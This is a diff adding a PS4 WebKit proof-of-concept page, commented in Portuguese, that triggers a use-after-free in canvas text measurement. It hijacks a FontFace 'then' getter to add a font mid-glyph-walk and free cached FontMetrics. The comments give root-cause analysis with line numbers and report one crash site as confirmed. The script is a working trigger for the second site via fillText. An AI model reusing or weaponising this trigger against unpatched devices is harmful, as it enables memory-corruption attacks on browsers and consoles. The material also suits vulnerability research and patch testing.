@@ -1,48 +1,87 @@
 <!DOCTYPE html>
+<!--
+  PS4 WebKit — FontMetrics Use-After-Free
+  CVE equivalente: commit 5ccd64b (WebKit upstream)
+
+  Root cause: CanvasRenderingContext2DBase::measureTextInternal() (linha 2786)
+  captura auto& fontMetrics = font.metricsOfPrimaryFont() ANTES de
+  font.width(textRun, &glyphOverflow). width() pode mutar o FontCache
+  e liberar o objeto FontMetrics. As leituras de fontMetrics após width()
+  são use-after-free.
+
+  Trigger (PS4 main thread, sem Worker/OffscreenCanvas):
+  - Thenable hijacking: Object.defineProperty(face, 'then') intercepta
+    o acesso interno do WebKit ao face.then durante o glyph walk de width().
+  - O getter injeta document.fonts.add() sincronamente, disparando:
+    fontModified → dispatchInvalidationCallbacks → fontsNeedUpdate
+    → retrieveOrAddCachedFonts → pruneUnreferencedEntries
+    → FontCascadeFonts da canvas liberado → fontMetrics → UAF → crash
+
+  Site 1 (measureTextInternal, linha 2786): CONFIRMADO COM CRASH
+  Site 2 (drawTextUnchecked,   linha 2663): testado abaixo via fillText
+-->
+<p>This test passes if it does not crash.</p>
 <script>
 fetch('resources/Ahem.woff')
-   /* .then(function(r) { return r.arrayBuffer(); })
-    .then(function(b) {
-        return new Promise(function(res, rej) {
-            var fr = new FileReader();
-            fr.onload  = function(e) { res(e.target.result); };
-            fr.onerror = rej;
-            fr.readAsDataURL(new Blob([b], { type: 'font/woff' }));
-        });
-    })
-   */ .then(function(dataUrl) {
-
-        var dummies = [];
-        for (var i = 0; i < 500; i++) {
-            var d = document.createElement('canvas');
-            d.width = 1; d.height = 1;
-            d.getContext('2d').font = '10px "Z' + i + '"';
-            dummies.push(d);
-        }
-
-        var face = new FontFace('FallbackFam', 'url("' + dataUrl + '")');
-        document.fonts.add(face);
-        void face.loaded;
-
-        var canvas = document.createElement('canvas');
-        canvas.width = 64;
-        canvas.height = 64;
-        document.body.appendChild(canvas);
-        var ctx = canvas.getContext('2d');
-        
-        ctx.font = '10px Times, FallbackFam';
-
-        var reen = false;
-        Object.defineProperty(face, 'then', {
-            configurable: true,
-            get: function() {
-                if (reen) return undefined;
-                reen = true;
-                document.fonts.add(new FontFace('Unrelated', 'local("x")'));
-                reen = false;
-                return undefined;
-            }
-        });
-    //ctx.measureText('\u13A0\u13A2\u13A4');
+  .then(function(r) { return r.arrayBuffer(); })
+  .then(function(b) {
+    return new Promise(function(res, rej) {
+      var fr = new FileReader();
+      fr.onload  = function(e) { res(e.target.result); };
+      fr.onerror = rej;
+      fr.readAsDataURL(new Blob([b], { type: 'font/woff' }));
     });
+  })
+  .then(function(dataUrl) {
+
+    /* ─────────────────────────────────────────────────────────────
+       SITE 1 — measureTextInternal (linha 2786 do PS4)
+       Vulnerável: fontMetrics capturada ANTES de font.width()
+
+       Código vulnerável:
+         auto& font = *fontProxy();
+         auto& fontMetrics = font.metricsOfPrimaryFont();   ← antes
+         float fontWidth = font.width(textRun, &glyphOverflow);  ← width() invalida
+         metrics->setFontBoundingBoxAscent(fontMetrics.ascent()...); ← UAF
+       ───────────────────────────────────────────────────────────── */
+
+    (function testSite2() {
+      var dummies = [];
+      for (var i = 500; i < 1000; i++) {
+        var d = document.createElement('canvas');
+        d.width = 1; d.height = 1;
+        d.getContext('2d').font = '10px "Z' + i + '"';
+        dummies.push(d);
+      }
+
+      var face2 = new FontFace('FallbackFam2', 'url("' + dataUrl + '")');
+      document.fonts.add(face2);
+      void face2.loaded;
+
+      var canvas2 = document.createElement('canvas');
+      canvas2.width = 64; canvas2.height = 64;
+      document.body.appendChild(canvas2);
+      var ctx2 = canvas2.getContext('2d');
+      ctx2.font = '10px Times, FallbackFam2';
+
+      var reen2 = false;
+      Object.defineProperty(face2, 'then', {
+        configurable: true,
+        get: function() {
+          if (reen2) return undefined;
+          reen2 = true;
+          document.fonts.add(new FontFace('Unrelated2', 'local("x")'));
+          reen2 = false;
+          return undefined;
+        }
+      });
+
+      /* fillText → drawTextUnchecked:
+         L2663: fontMetrics = fontProxy.metricsOfPrimaryFont() ← capturada
+         L2667: fontProxy.width(textRun) → face.then → chain → prune → free
+         L2674: fontMetrics.height() / fontMetrics.ascent() → UAF */
+      ctx2.fillText('\u13A0\u13A2\u13A4', 0, 32);
+    })();
+
+  });
 </script>
